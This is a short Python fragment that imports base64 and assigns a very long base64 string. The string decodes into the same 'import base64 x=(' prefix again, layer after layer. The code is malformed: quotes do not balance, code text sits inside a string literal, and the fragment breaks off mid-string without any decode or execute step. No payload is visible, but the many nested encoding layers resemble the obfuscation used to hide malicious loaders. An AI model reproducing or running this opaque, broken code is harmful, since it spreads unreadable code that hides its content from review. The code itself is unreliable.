import base64
x=("import base64
x=("aW1wb3J0IGJhc2U2NAp4PSgiYVcxd2IzSjBJR0poYzJVMk5BcDRQU2dpWVZjeGQySXpTakJKUjBwb1l6SlZNazVCY0RSUVUyZHBXVlpqZUdReVNYcFRha0pLVWpCd2IxbDZTbFpOYXpWQ1kwUlNVVlV5WkhCWFZscHFaVWRSZVZOWWNGUmhhMHBMVldwQ2QySXhiRFpUYkZwT1lYcFdRMWt3VWxOVlZsVjVXa2hDV0Zac2NIRmFWV1JTWlZaT1dXTkdVbWhoTUhCTVZsZHdRMlF5U1hoaVJGcFVZa1p3VDFsWWNGZFJNV3QzVld4T1ZsWnNWalZYYTJoRFYwWmFjMk5JUm1GV1YxSlRXbFphVDFkWFRrZFZiV2hvVFVoQ1RWWnNZekZrTWsxM1RsaE9WR0V5VWxSWmJURlRZMVpXY1ZGdVpGaGlSbHBaVkd4a1IyRkhTbFpqU0hCV1lsUkJlRll5YzNoalZrcHpZVWRHVjFZeFNsVldha0poV1ZkU1dGUnJhR3RTYkVwVVZtdFdZVlZXV2xkVmEzQnNVbTE0V1ZadGVHOVdSbVJJWlVVNVZtRnJjRlJYVmxwVFYwZE9TVlJyTlZkaVZrcFhWbXRrTkdFeVNrZFhXR1JQVmtWS1dGbHNVbGRYUm14VlVtdGtUMkpHY0RGV1Z6RkhWVEpLV0dGR1ZsZFNiSEJ5VmtSS1UxSXhaSFZXYlhCVFYwVktWVlpHWXpGaWJWRjRXa1pXVW1KWVFsQldha1poVjFaYVdHUkdUbFppVlhCSVZqSXdOVlpyTVVkWGFrNWFaV3RhY2xacVJuZFNNVkp6VjJ4a1RsSXpZM2hXYTFKSFlqRlJlRlpZYUdGU1YyaHZWVEJWTVZkV1duSldWRVpZVW14S1YxZHJWbmRpUjBwR1RsWmtWV0pHV2xSWlZscGFaV3h2ZWxwR2FGZFNWWEI0VmtkNGExWXhaRWRXYmtwV1lrVndiMWxVUW5ka2JGcDBUbGhrVTAxck1UUlZNblJyVlRKS2MyTkdXbHBXUlVWNFdrUkdZVkl4Y0Voa1JscHBVakZLU1ZacVJtOWhNV1J6VjJ4b1ZWWkZXbWhXYlRGVFZVWlNkRTFWY0d4V2JrSklWVEo0YTFZeFpFWlRiRTVYWWxoU1dGWkhNVmRTTVZKeldrWk9hVkp1UWxkWFZsSlBZakZhUjFkdVVtdFRSVFZ4Vm0xNGQyVldaSEpYYlhSb1lYcEdXbFZYZUhOWFIwVjVZVWh3VjAxdWFHaFViWGhIVmxaT2MxZHNaRmRpU0VFeVZteGtORmxYU25SVldHaFVZbXR3VmxscldtRlVNVlYzV2tjNWExSnNjRlpWVjNoclZUQXhWbU5GYUZkU2JXaHlWbXBLUzFKck5WWlhiR1JYWWxkb1JWWlhkR0ZaVmtwWFUyNU9WV0pWV25CVmJUVkRVMFphUlZKc1pFOVNiRlkwVmpKNFYxWnRTbFZXYkdSV1lsaE5lRlZVUm5Oa1IwNDJVbXM1YVZKc2NHRlhWRUpoVVRGVmVGTlljRlZoYXpWWVZXcE9VMVpHVmxoTlZtUnFZWHBHV2xWdE1YZFZNVnBaVVd4U1YySllhR2hYVmxwclVqRmtXVnBHYUdoTk1VcFFWMWQ0VmsxV1pGZFhXR3hxVFRKb2IxUldXblpOYkZaMFpFYzVXbFpzY0ZoVk1uaHZWbTFGZUZaWVpHRldiSEJRV1RGYVlXTXlUa2RhUjJ4VVVsVndSMVp0ZUdGaE1ERkhWVzVTVm1FeGNGRldiRnAzVmxac2NsWlVSbGRTYkhCNFZUSjRUMVpHV25WUmEyeFZZa2RSZDFscldrdGtSbFp6Vm14b1YxSlZWalJXVjNSclVtMVJkMDVXV21wU2JIQllXV3RvUTFaV1dYbE5WRkpWVFZad2VsWnROVTlXYlVWNlVXeFNWbUV4V2t4YVJscGhZMVpTZFZSdGFHbFdhM0JJVmtaYVlWWXhWbk5hUldoV1lYcHNZVlpxVG05U01YQllaVVpLYkZKc1dqRlZNbk14WVVkV2RHVkdaRmRoYTFwVVZsUkdVMk14V2xsaVJsWnBZbXRLVmxadGVGWk5WMDVYWTBWYVYxZEhhRmhXYlhSaFYyeGtjbFpVUm1oU01IQkhWbTF3WVZZeFNrWlhiRkphVFc1T05Ga3ljelZXTVZwellVWmtVMkV6UWxGV2JYaFRVekZWZVZKWWFGVmlSbkJXV1ZSQ2QySXhiRmhrU0dSVlZtMVNNRnBWYUU5aVIwWTJZa1p3Vm1KVVZuSldSekZIWXpGT1dXTkdWazVXYkhBMlZtdFNTMVF4WkZkU2JHeHBVbXhhVkZaclZtRk5WbHBIV2tSU2FrMVhVbGhYYTFwelZXeGFSMWR0T1ZkTlJuQjZWR3hhWVZKc1duUlBWbWhwVmxSV1dsWXhVazloTVZwR1RWWmFUMVp0VWxaV2JYaGhWRVphVlZGWWFGTk5WMUl3VkZaYVlXRldaRVpOU0doWFlURndhRlY2Umt0ak1XUjFWR3hXYUUwd1NsVldWM1JYVXpKU1YxWlliRTlYUlhCUVZtcEdZVTFHV2xoa1J6bFdVbTFTU1ZwVlpFZFdNa1p5WTBaU1dtVnJXbFJWYkZwUFl6RndTR1JHVGs1V1dFSmhWako0VjJFeVNYbFNXR2hVVjBkb1dWbHRkSGRXYkZWM1lVVk9VazFZUWtsYVZWWXdWVEpLUjFOdWJGcE5SbkJZVm0weFYyUkhWa1pYYkdST1ZtNUNlRmRzVm10VE1VNUhWVzVXVm1KRk5WaGFWM2hoVWpGYWMxZHRPVkpOVm5CSVZtMDFUMWRIUlhsVmJHaGFZVEZhTTFZd1dtRlRSMVpIV2tab1YxWkZXbGxXYWtvMFZURlplRk5zV2s5V1ZUVldWRlphWVdWc1ZuSlhibVJVVWxSc1dWcEZXbE5WTWtWNVQxUmFWMDFXU2xCYVJFcFRaRVpXZFZOdGRFNU5ibWhWVjFjd2VGVXlTWGhYYkd4cVVteHdjbFJXWkZObGJHUnlWV3hPYUZacmNEQlVNVkpoVm1zeGNWSnVXbHBXYkhCWVZHMTRZV05XVG5OalJUVm9ZVEZ3TkZZeFkzaE5SMDE0VTJ0a1UySkhhSEJVVkVvMFZsWlNXR1ZJWkZwV2JYUTFXVEJvVDFSc1duTlRiRnBXVFc1Uk1GbFdWWGhrUmxaelUyeG9hRTF0YUVsWGExSkNaVWRPZEZacldrOVdNRnB6V1ZST1EyRkdXbkZSYlVacVRXeEdNMVF4V205aFZrcEdZMFU1V2xaRk5YWlZNbmhhWlVkR1JscEhiR2hsYTFwSVYydFdZV0V5UmxkVGJGcHFVbXRhV0ZSVldrdFNSbHBGVW1zNVYwMVZOWHBXTW5oWFlVVXdlV0ZIUmxkU2JIQm9WMVphWVZJeFpISlhiRlpvVFVoQ1VsWnRlR3RPUmtwWFdraEtXbVZzV205VVZsVXhVMFpWZVdORk9WaGhla0kyVlZkd1MxbFdTWHBWV0hCaFZteHdURnBHV25kVFIwWkhWMjE0YVZKc2JEWldiWEJMVGtkRmQwNVZhRlJoTWxKd1ZGUk9RMVpXYkhOYVJ6bHFVbXh3V2xrd1dtdFViVXBJWkVSV1ZWWnRVak5aVm1SR1pVWk9jMVJzY0doaE1GWTBWbGQwYTFNeFdYaFVibFpWWWtkb2NGWnFUbTlTVm1SVlVXMTBWV0pXV2tkVU1WcFhWa2RLV1ZGc1VtRldNMmhvV2tWYVdtVkdaSFJrUmxaT1VrVmFTbFpYTVRSak1XUklVMnhzYUZKVVJsZFdhMVozVG14U1dHVkZkRk5OVlhBeFZqSjRWMkZGTVVWV2FrNVhWbXh3Y2xsVVJrOWpNVXBaV2taU1dGSXhTbWhXUm1SM1ZqSldWMVZ1VW10U2F6VlhXV3hXYzA1V1pISldibVJXWVhwR1IxWXlOVmRXYXpGWFYyeENWbFl6YURKYVJFcExVbTFLUjFWdGJGaFNNbWcwVm10YVUxRXhUWGROV0U1cFUwWktVRlpzVW5OalJsWnpXa1JTVTJKR1NsZFhhMlF3WVVkS1ZtTkdhRmROYmtKVVYxWmFTMlJHVm5OaFIwWlhaV3RhVlZaVVJtRlZNV1JYVjI1U1UyRjZWbkJWYlRFelpXeGFXV05GVGxwV2JYaFlWbTE0YTFadFNuSk9Wa1pYWWtad1RGWnNXbGRqTVdSMFVteE9WMkpHYTNsV1YzaFRWakZaZVZOclpGaGliWGhvVld0Vk1WVkdWWGxsUlRsVFRWVTFNVmRyV25kaFZrbDRVMnhzV0dFeVRqUldWRVpyVmpGYWMxWnRiRk5XUjNoWVZrWmpNVlV4VmtkV2JGWlVZbXMxVTFscll6Vk5NV3h5Vm14T1ZtSkdiRFZXVjNRd1ZteGFSbE5yYUZwaVdHaDVXbFpWZUZZeGNFWk9WazVPVmxoQ2FGWnNVa3BOVmxsNFZHNU9WV0V4Y0hGVk1GVXhXVlp3V0dONlJsTlNia0pKVkZaV01HRXhXbk5UYWtKaFZsWldORmxXWkVkT2JGWnhWR3hrVGxadVFqSldiRkpDWlVaa1IxVnNiR2hTYTBwWVZGUkNTMlF4V2tkYVJGSlVUV3N4TkZaSGVHRldiR1JJVld4R1YySkhVVEJWYlhoV1pVZEdTR1JHVm1sU1ZuQlhWbFprTUU1R1drZFhiRnBQVmxVMVdWbFhkRXRsYkZWM1YyMUdhbFpzV25wWk1GVXhZVlpLZEU5VVdsZE5ibEpZVmtSR1JtVldXbk5hUjNCVFlsaG9WVmRXWkRCWlYwWkhWMWhrVjFaRlNuSlVWbVF3VG14c1dXTkZaRmRoZWtaYVZWZDRkMVp0U2xsUmEyaFlWbXh3Y2xWdGN6RlRWbkJIVjIxc1UwMXRaM2xXTVZwclRrZFJlRnBHWkZOaWExcFRXV3hrYjFkR2NGaE5WRTVzVW14d1JsVXlNWGRoTURGV1RWUk9XbUV4V2xSV1YzaGFaVlpXY21SR1dsZFNWWEJKVjFjeE5GUXhXbk5WYmtwVllsaG9XRmx0ZEV0WlZscHpXa2hrVTAxcldqQlZNbmhYVm0xS1ZWWnNaRnBpUmtwSVZUQmFjMDVzVG5KT1YzaFhZa2hDV0ZaSGVGZFZNV3hZVm01S1ZHRjZSbGhVVnpWVFkyeGFjVk5yZEZkaVZYQkhXV3RhVjJGV1pFaGhTR1JZVmpOb2FGVjZTa3RXTWtwSFdrWndUazF0YUhaV1Z6QjNUbFUxVjFkdVRscGxiRnB2VlcxNGRrMXNWblJOUkZaWVVqQmFlVmt3V205WFIwcFZVbXhDVmsxR2NFeFpNVnBIWkVkR1IxTnJOVTVpUlc5NFZtMXdSMVV4VFhsVFdHeFRZVEpvVjFsVVNsTlZWbGwzVm10MGFGSnNXbFpXUnpFd1lWZEtTVkZyYUZwV1ZsVXhXVlphU21Rd05WVlJiRlpwVWpGS01sZFdXbUZYYlZaSFYyNVdZVkpzV2s5WmJGVXdaV3hhV1dORlRsVk5WbHA1VkZaV1lXRXhTbGxSYkU1VlZsWmFhRnBHV2xabFJscDBaRWR3VG1KRldUQldNbkJQWXpGVmVWTnNiRlppVjJoWFZGVmFZVTB4YkRaU2JrNVBZa1pLZVZSc1pFZFViRnBXWTBaYVYxWnRUWGhaZWtaelZqRndSbGRzYUZoU01taGFWMWQwYTJJeFZrZFZiRnBoVWxSc1VGWnNVbGRYVmxKeldrVmtXRkpyY0hsV01uQkxWbXN4ZFZGcmVGcGhhMFkwVlRCYVYyTnRTa2RUYld4cFlUQndVMVl4V21GVk1rbDNUVmhPWVZKdFVtOVZiRlV4WTFaV2MyRkhPVTVTYlhoNVdWVmtNR0ZHU25OaVJGSmFZbTVDU0Zac1drdE9iRVpWVW0xR1YySklRWHBXUjNoaFkyMVdjMUp1U2s1V01uaHdWV3hvUTA1c1dYbGxSbVJwVFZaYWVsbHFUbXRoVmtwWFUyeGFXbFpGU2pOV1ZFWnpWMWRPU1ZSc1ZtbFNhM0JKVm0wd2QwNVdWblJUYTFwWFlXczFhRlZzV21GaFJscDBaVWhrVDJKRldubGFWVnBUVmpGYVZWWnJVbGROYmtKRVdYcEdUMUpyTVZkaFIzaFRUVEJLVUZaR1ZsTldNbEp6VjFoc2FsSllVbGhaYTJNMVRrWldXR1ZHVGxaaVZYQldWVzEwTUZsV1NsaFZibkJoVW14V05Ga3hXbGRqVm1SellVWm9VMVl6VGpSV01uUmhWbTFXUjFSdVRsWmliRXB3VlRCa2IxUXhiRlZVYkU1clVteHNORmxWVlRWaFJURnlUbFp3VjAxWGFIcFdhMVYzWkRKT1NWRnNjRmROTVVwUlZsZDRZV014WkZkVGJsSnJVako0V0ZacVNtOVVSbHB5V1ROa2JGSnJOWGxVVm1oTFlURktObEpzYkZkTlJsVjRXVEo0YzFZeVJraFNiRkpwVW10dmVGWlhNREZoTVZKMFVsaHdhRkpZUWxoVVZtUnZWRVpTZEUxVmNHeFdia0pKV2xWVk1WUnNXblJQU0d4WFlXdHZNRmxxUms1bFZsWnpXa2RzVTJKWGFGQldiWEJQWWpKU1IxZHVVazlXZW14UFZtMTRkMlZzYkZaV1ZGWm9WbXRzTTFSc2FHdFdiRmw2VldwT1YySllhRXhWTUZVMVYwVTFXRkpzWkZOWFJVa3lWakowVTFJeVNuUldiR1JVWW14S2NsVnFRbUZXVmxaellVVk9iR0pIVWxwWk1GVTFWbFV4UldKR1pGcGhNazE0VmtkNFMxZFdWbkprUmxwWFVsVndTVmRYTVRSVU1WcHpVMnhzWVZKc1NrOVZhazV2VW14YVYxZHRkR2hOVlRWNlZrZDBiMVp0U25SVmJXaFdZa2RTVkZwR1dtdGpWazV5WTBkNGFWSldiM2RYYkZacll6SkdSMWRZYkdoU1JUVlpWbXBPYjJOc1ZuRlRhM1JxVFdzMVNGZHJXa05YUmtsNFUyMW9WMkZyU21oVmVrcFRZekZXY2xkc1ZtaE5TRUozVjFkNFZrMVZNVWRXV0doYVpXdGFWbFZ0ZUZkTk1WVjVUVVJXV0dGNlFqVmFWVlpUVjJzeFNGVnJlRmROUm5CTVdrVlZNVmRHU25OYVIyaHBWMGRrTTFacVJtRlpWMFYzVGxWb1ZHRXhjRkZXYm5CWFZERldjMkZHVGxSTlZscFdWVmQwYTJGWFNrWk9WbVJYVWpOU1RGZFdWWGhUUjFaR1ZteGFWMlZzV2paV01WcGhZVEZLYzFwR2JHaFNiV2h3VldwS2IxVldXa2RXYlhSVlRVUldWMVJzV25OWlZrbDVaVVU1VlZaV1NsUlVWRVpYVG14R2RHUkdhR2xXV0VGM1ZsY3hNR014V25SU2JrcFVZbXRhVjFSVldsZE5NVkpZWlVaT1ZGWXdXVEpXYlRGdlZUQXhSVlpyY0ZoV2JFcFFWbXBLUm1WR1RsbGhSbWhwWW10S1dsZFhkR3RWTWs1elkwWmtXR0pyTlZsVmJGSkhVMnhhZEUxWVRsVmhla1pLVlZkd1IxWXhTbGRUYTNoV1pXdHdWRnBGV2xkamJVcElaRVpPVjFaR1dsaFdhMXBoV1ZaTmVWTnNaRmhpYTNCWVZtdGFZVlpzVm5Sa1NHUlhUVlpLZWxaWE5VOVdWbHBWVVdwT1ZXSkhhRkJXTWpGTFZsWktjMVZzWkZkaVZrcEpWbFJDVms1V1dsZFNibEpwVWpOb1dGUlZVbFpOYkZwVlVteGtVMkpXUmpSV1JtaHJZVlpLVjFOc1RsZGhhM0JVVlhwR1YxWldSbkphUjJ4cFVsUldXRlpyWkRCVE1XeFdUVlZvYkZKV1dsZFdiVEZUWTJ4VmVXVkZXbXROVlhBd1ZHeGFVMVl4V2xWV2ExSlhUVzVDUkZsNlJrdFNNVXB6WVVkR1UxZEZTbFZXUmxwWFpESlNjMXBJU2xkaVdGSlVXVmh3YzFkV1duUmpSbVJhVm10c05sVlhNRFZXYlVaeVUyMUdZVkpGV25KVmJGcFBaRlpTZEdGRk5WUlNWVlkxVmpGa2QxTXlSWGhhU0VwT1YwWktiMVZ1Y0hOaFJsWnpWMjVLVGxadGRETldNalZyVlRGSmVGSnFWbGhoTVZsM1ZrY3hSMDVzV25WWGJHaFhVbFZ3TWxac1VrdFVNVTVIVkd4c2FWSlViRlJhVjNoaFZXeGtWMWRzWkZSTlJFWklWMnRvVDJGR1NsVmlTRTVhWVRKUk1GWXhXbXRqYkhCRlZXMXNWMkpHV1RKV01uUnFUVlpWZUZOdVNsaGhhM0JaV1ZkMFMyVnNWbkpYYTJSWVVtNUNSMWt3V2t0VWJFcFhZMFJHVjFaRldsaFdSRVpIWXpKSmVscEhiRk5XYTNCVVZtMXdTMVV4VFhoV2JGWlNZVEpTY0ZsclZURldNVnBJWkVWMFdsWlVSa2xhVlZaWFZteGFkRlZ1U2xoV2JWSk1WakJrVjFOWFRrZGhSMnhUVFcxb1VWWnJVa2RoTVZsM1RsWmthbEpYZUdoVmFrcHZWa1p3V0UxVVFrNU5WMUpaVkd4b1QyRkhSalpXYm14YVlURmFkbGxXV2s5U01VNTBVbXhrYUdFelFsVlhXSEJIWVRGS1YxUnVVbE5pV0VKVVZGVm9RMU5zV25STldHUnFUVlpLU0ZadGVGZFZiVVY2WVVaU1ZtSllVbWhVVkVaelZsWktkVnBHYUZOaVZrcGFWakowYTJReFdrZFRiR3hTWVdzMVdWWnVjRUpsUmxwVlVtNWthMUpyTlhwWlZWcHJZVmRLY2xOdWFGZFNiVkYzVjFaa1UxWXhjRWxVYkdoWFVteHdVRlpHWkRCWlZtUnpWMnhvVGxKR1dsbFdiRkpIVFVad1ZsVnJaRnBXYTNCWlZsZDRiMWxXV25SVmJGSmhVbFp3VEZwR1dsTmpiVlpIVkcxNGFFMVlRVEpXYWtadlpERlJlRlZZYkZOaE1sSndWRlJLTkZkR1dYZFdWRVpVVFZaYWVGVXljRk5VYkZwMVVXdGtXR0V4Y0hKWmExcGFaVVpPY1ZGc1dtbFdSbHBSVm10YVlWSnRVWGhVYmtaWFlrZG9jRlZxU205U1ZtUllaRWRHYWsxWFVsaFdiWGh6VlcxS1JsTnRhR0ZXTTFKTVZrWmFWMk5zWkhKYVIzUnBVbnByZWxkWGRGZFZNVlp6VjFoc1ZtSlhhR0ZaYTFwTFpXeFNjMWRyT1ZkaVIxSldWbGN4UjFSdFJYaGpSbkJYVWpOU2NsbFVTa2RrUms1elYyeG9hR0V4Y0ZwWFZtUXdaREZaZUdKSVJsUmhlbXh5VlcxNGQwMVdaSEphUldSWFRVUkdTRmxyVWs5V2JWWnlWMnhTWVZJemFGUlpNbmhUWkZaR2MxTnNaRTVpUlhCTlZteGFVMUV4U1hsVGJrNVZZa1p3VmxsVVFuZGhSbEpZWTNwR1ZHSkdWalZVYkZaUFlVWlpkMk5JY0ZaaVZGWm9Wakl4UzFOR1ZuTmhSMFpYWld0YVVGZHNXbUZUTWxKR1RsWm9VMkpHY0U5WmJYaExWVlphVjFWcmRHcE5WVnA2V1dwT2EyRldTbGRUYkU1WFlXdHdWRlY2UmxkV1ZrWnlXa2RzYVZORlNraFdNblJ2VkRKRmVGTnVWbEppUmxwV1dXdGtiMDB4YkZkWGEzQnNVbTFTTVZaSGVIZFViRXBWVm1wS1dGWkZTbkpWZWtwVFZqRmFkVlZ0ZUZOTk1FcDNWMWQwYjFFeVVuTmFSbWhyVWxSc2NWbHJXa3RsVmxwSVRVUkdWV0pGY0ZwV1Z6RnZWbTFHY2xkdGFHRlNWbkJRVm0xNGQxSnJPVmhpUlRWWVVsVndZVlp0ZEdwTlZrMTRXa1phVGxOSFVuRlZNRlV4V1ZaU1YxcEhPVmhTYlhoNVYydFZNV0pIU2tkWGFrSlhUV3BHTTFaSGMzaFdiVTVKVjJ4b2FFMVdjREpXYlhCTFZqSk9kRlZyV2xaaVYyaHpXV3RvUTFJeFduTlhiWEJQVm1zeE5GVXlkR3RWTWtwelkwZG9WVlpYVVRCVmJGcFhWakZ3U0dSSGFHbFdXRUpaVm1wS2QxbFdaSEpOVldoVlZrVmFhRlZ0TVZOVU1YQlhWMjFHV0ZKdVFraFZiWGhoVkd4S1dFOUlhRmRoYTI4d1dXcEdTbVF3TVZkYVIzQlRZbGhvVjFkV1pEQlRNazVYWTBaa1ZtSkhVbkpXYlRGVFpXeHNWbGRyZEdoV1ZFWllWakkxYzFZeVNsbGhSWGhYWVd0YWFGWnFSbXRqTVZweldrZG9UbFl6VGpSV2JUQjRUa1paZVZSdVVsWlhTRUpUV1ZSR1lWWXhXblZqU0U1clZteFdORlp0Y3pWVmJVcElUMVJXVjFKNlZsUldha3BIWTJ4T2RWTnNaRTVTYkc5NlZrWmFZVlF4V25SU2ExcHJVako0VkZSVlVrWk5iRnBYV1hwR1dsWXdXbGxWTWpWTFZERmtSazVXV2xaaWJrSllWbFZhVTFac1pIVlViR2hYWWtad05GWlhNSGhrTVZKelYydG9iRk5IYUZsV2FrNURWRVphVlZOcmRGTmlWWEJIVm0xek1WVXhTWHBoUlhoWFZqTlNXRmw2UVhkbFJsWnpWMnhPV0ZJeFNsWldSbFpoVXpGVmVHRXpaR0ZTUlVwaFZtMTRjMDVHYkhKWmVrWllZbFZ3U1ZaWGRHOVhhekZJVld0NFdrMUdjREphVjNoSFl6RkdkRkp0ZUdoTlNFSlBWbXhTUjFZeFVYaFNiazVwVFRKU2NGVnNaRzlqUmxaMVkwVmtWRTFXV2pGWk1GcHJWRzFLU1ZGclpGZFNNMUpRV1ZkNFNtUXdNVlZWYkZaT1ZtdHdUVmRXWkRSVE1EVnpWMjVTVGxadGFGaFpiRnBMVlZaYVIxWnRkRk5OVjFKWVYydG9VMkpHU2xsaFJrNVZWbnBXVDFwV1dsZGpiR1J5V2tkMGFWSjZhM3BYVjNSWFZURldjMWRZYkZaaE0xSlhWbXRXUzFOR2JIUmxSVGxYWWxWYVIxWkhNVFJXTURGSFkwWndWMUl6YUZSVlZFWlRVakZLV1ZwSGNGTk5NRXBYVm0xNFlWTXhVWGhqUm1oc1VqTlNVRmxyV2t0WGJHeFdXa2hPVjAxcmNFcFZWM2hQVmpKRmVWVnVjRlpXUlhCUVZUQmFVMk5XV25OVGJXeHBVbTVDTTFacldsTlNNVWw1VTI1T1lWSnRVbWhWYkZKelZERldjVkZ0UmxoaVJtdzFWRlpTVTFaV1dYZFhiR1JXVFc1b1dGZFdXa3RYUmxKVlVtMUdVMUpZUWxGV1ZFSnJVekZPVjFkdVVsTmlXR2hZVm14a00yVnNXWGhYYkdSb1RWWndlbGxxVG5OV1ZtUklaVVphV21KVVJUQlpha1phWkRGYWNtTkhkRTVXYTNCS1YxZDBWMlF5Um5OVGJHUlVZa1UxWVZsWGRIZGpiRlY1WlVWYWEwMVZjREJVYkZwVFZqRmFWVlpyVWxkTmJrSkVXWHBHVDFZeFVuVlZiWGhUVFRGS1ZsWlhNVFJrYXpGWFdrWm9UbFl6UW5KVVZsVjRUVEZhV0dWRmRHaFdWRVl3VmxkME1GWnNXa1pUYTJoYVlsaG9NMVZxU2tkU2F6bFlZa1pPVGxKR1ZqTldhMlEwWVRKSmVWSnNaRmhYUjJoWVdXeFNWMVl4Vm5SamVrWlRVbTEwTTFkclZqQmhNVnB5VjI1b1ZtSlVSWGRXVjNONFpFWldkVnBHWkU1U2JIQlZWbFpqZUZZeVRuSk5WV3hvVWpOQ1QxUlVRa3RWYkZwWVpFYzVWV0pXV2toV1ZtaDNZV3hLV1ZGdVNsVldWa3A2VmpGYVUxWXhXblJTYldoWFRVaENObFpVU1RGVU1XUnlUVmhTYkZKV1NsWldiR1JUVTBaVmQxZHRSbGhTYmtKSVYydGFUMVJzU25SUFNHaFhZV3R3TTFWNlJscGtNREZXVjIxc1UxWXhTbGhYVjNodllqSk9SMVp1UmxOaVZWcHlWbTB4TUU1V1VsZFdiWFJvVFZWd1dWcFZWbTlXTWtwVlZtcE9XRlpzY0hKVmJURlBVbFpLYzJGR1pHbFdWRkYzVmpGa01GbFhTWGhUYkdSVFlrZDRjVlZzVWxkVU1WbDNWbFJDVG1KR2NFaFdNakYzWVRBeFJWWnViRnBoTVZwVVZtdGFhMUpzVG5KWGJHUlhZbFV3ZUZkWE1UUlVNVnB6Vlc1S1ZHSlZXazlaV0hCWFV6RmFWVk5VUmxKTmExcFpWVEkxVDFVeVNuTmpSbXhhWWtkUk1GWkZXbXRXVmtaWllVWk9WMkpGY0dGWFZFSmhZakpLU0ZKcVdsSmhiRnBaVm1wT2IyRkdXa1ZSV0doVFRXdHdTRmxyV2xOaFIwVjNZMFY0VjFaRlNsZFVWbVJPWlVkS1NWVnJOVmRoZWxaNFZsZHdRMlF3TVVkYVJsWlVZbGhTY0ZWdGVIWk5iR3hWVkcwNVdHRjZSakJhVlZaVFdWWmFjMk5FVGxkTlZuQklXa1phYTJSSFRraGlSMnhUVm01QmVGWnFTakJXTWtaeVRsVmthVTB5YUc5VmJGcGhWVEZaZDJGRlRsVk5Wa3BZV1ZWVk5WUXlTa2RUYkdoWVZrVTFkbFpFUVhoak1VNXpZMFprVTJWclZYZFhWbU40VXpGYVYxZHVVbEJXYmtKd1ZXcEdTMWRXV2tWU2JHUnFUV3MxU1ZWc2FHdFVNVnBYVTIxb1lWWXpVa3hXUmxwV1pVWmFjazlXU21sU2VtdDZWMWQwVjJNeFZuUlRibEpzVW5wc1dGbHROVU5XTVhCRlVtMTBVMVpyTlZwWlZXUnpWVEF4UlZKVVNsZGhNazQwV1dwR2MxWnJNVmxVYkdocFZrVmFiMVpYZEZka01sWnpWV3hhWVZKWFVsUlVWVkp6VjJ4V1dFMVlUbWhXTUhCSFdUQm9kMWRHV2taaE0yaFlWbTFTU0ZVd1drOWpiRlowVW1zMWFWZEhhR2hXYkdRd1ZqRkpkMDVZVGxaaVJscFVXVzAxUTJNeGJGbGpSbVJZVm14S1dGWXllRTloUlRGV1lrUk9WMDF1UWxoWFZscExWbXMxVm1SR2NHeGhNSEEyVmxkNFlWSXhaRmRYYmtwUVZteHdUMVJYZUV0TlZscHlWMjFHVlUxck5YcFdWelZMVmxkS1ZWWnJPVlppUjJoVVZYcEdWMVpXUm5KYVIyeHBVbFJXV0ZZeWRHOVVNa1pYVjJ4b2JGSlhlRlpaYTJSdllVWnNWVkpyV210TlZUVXhWVzE0ZDFZeFdYaFRiR3hZVm0xT05GVnRNVmRTYXpsWFlrZHNVMDFHY0ZwV1YzaGhZekExUjFkWWJHeFNlbXhXVkZWU1IxTkdaSEZVYm1SWFZqQmFlVlV5TVVkV01ERkhZMFYwWVZaV2NIbGFWekZMVTBVMVdHTkdUbGRTTTJkNFZtdGFWMVl3TVVkVWJrNVRWMGRTVkZsc1VsZFdWbHB6VmxSR1VrMVhVbmhWVnpWUFZURktjbGRxUmxoaE1sSXpXVlphV21Wc2IzcGhSbWhvVFZad1VWZFhNSGhTTVZsNVVtdGFWMkpGY0ZsVk1GWkxWVVphUjFkdE9WVk5SRlo2VmxkNGExZHJNSGxoUm1SVlZtMW9SRll5ZUZka1IwNUdXa1p3VjJKV1NraFdSM1J2WVRGYVIxZHNhR2hTYkVwb1ZXcE9VMlZzVlhoWGJHUnJVbFJzV1ZWdGVHRlViRXBZVDBoc1YwMVdjR2haYWtaV1pWWk9jbGR0YkZOV01taGFWMWQ0YTJJeVNYaFhia1pWWWxSc2NWUldaRk5sVmxwSFZXdE9XbFpVUmxoV2JYQmhWakZhTmxadGFGcFdNMmhRVlcxNFQyUldjRWRqUjJ4WFVsWndORlpxU25kVE1WVjRWR3RvVTJFeWFITlZiR2hEVmxaV2MxVnNaR3hTYlZKV1ZURm9iMkZyTVhOU2FsWlhWak5TVkZaRVJrcGxWMVpHVFZaa1YySkZjRVZXYTFaaFZERmFjMVZ1U2xSaVZWcFBWV3BPYjFKc1dsZFhiWFJvVFZVMWVsVnNhR3RXUjBaelYyeHNXbUV5VW5aV2ExcFRWakZ3Ums5WGRGTldSbHBJVmtkNFYxVXhiRmhXYmtwVVlYcEdWMVJXV21GVlJsWllaVWhhYTAxcmNFZFpWV1J6VmtaS2NtTkhhRmRpV0VKTVZsUktUbVZIUlhwalIyeFRWbGhDVWxadGVHdE9SazVIWTBWYVdrMHlhRlZaYTFaelRrWnJkMVZyZEZoaGVrWXdXbFZXVTFkdFNrZFhibkJXVFVkU1RGVXhXbUZqYlU1SFZHMTRhVmRIVGpWV2JYUlhZVzFXUms1VmFGVmhNbWhXVmpCb1ExWXhiSE5oUms1cFRWWnNNMVp0TlU5aE1rcEhWbXBTVjJKSGFIWldWekZMVW0xS1JWUnNaR2xXUlZwdlZteFNTMUl3TlhSVGExcFBWbXh3YjFSV1duZFhWbHB6Vld0T1RsSnNjRWhWYlRWWFZXMUtWbGR0T1ZkaVJsb3pWRlZhWVZKc2EzcGhSbVJPWWtWd1dWZFVRbGRqTVZwWVVtNUtUMVo2YkZoVVZWcDNWRVp3U0dWRk5XdE5Wa293Vkd4a2MyRkZNSGxhTTJoWFZtMU5lRlpxUm5OWFJscHpZVVpXYVdKclNsWldiWGhXVFZkT1YyTkZaR0ZTVjFKeVZtMTBZVTFHVW5OV2FrSnBVbTFTU1ZaWE5WZFdhekZ4Vm01c1ZWWnRVbEJXTUZwVFkyMUdSMXBIYkZkU2JIQk9Wako0WVdFd01VaFZXR2hoVWxkU1ZGWXdaRk5XVmxKV1YydDBWazFYZUhoVk1qRXdWa2RLUmxacVRsWmlWRUY0VjFaYVMxSnRUa2xqUmxaWFZqRktTVlpYZEdGU01rMTRWMjVTYUZKc1NsUldNRlpMVG14YWNWSnRSbWhOVmxZMFZtMTRiMVpHWkVobFJrWlhUVVpWZUZacldscGtNWEJJVDFkd1RsWXhTbGRXYTJRMFlURlNjMU5ZWkdsU1JuQlhWRlprVGsxV1drWlhiRnByVFZVMU1GUXhXbmRVYXpGMVlVVldXRll6VW5KV2FrWlBVakZrZFZWdGNGTk5NVXBhVmxjeE1HUnRWbGRhUmxaVVltMVNjbGxyV2t0bFZscElUbFZPVm1KR2JEVldWM1F3Vm14YVJsTnJhRnBpV0doUVZtMTRVMk5zVG5SU2F6VllVbFZzTkZadE1IaGtNVVY1VWxob1